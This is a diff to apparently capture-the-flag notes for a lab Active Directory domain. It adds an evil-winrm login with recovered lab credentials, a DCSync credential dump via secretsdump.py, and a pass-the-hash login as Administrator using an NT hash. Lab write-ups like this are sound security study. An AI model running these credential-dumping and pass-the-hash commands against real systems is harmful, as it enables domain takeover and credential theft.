@@ -41,5 +41,14 @@ strPassword = "bNdKVkjv3RR9ht"
 ```
 ##### Evil-winrm 2.4
 ```bash
-evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i 10.10.179.93
+evil-winrm -u a-whitehat -p bNdKVkjv3RR9ht -i $IP
+```
+
+##### DCSync
+```bash
+secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@$IP
+```
+##### Pass the Hash
+```bash
+evil-winrm -u "Administrator" -H "c2597747aa5e43022a3a3049a3c3b09d" -i $IP 
 ```
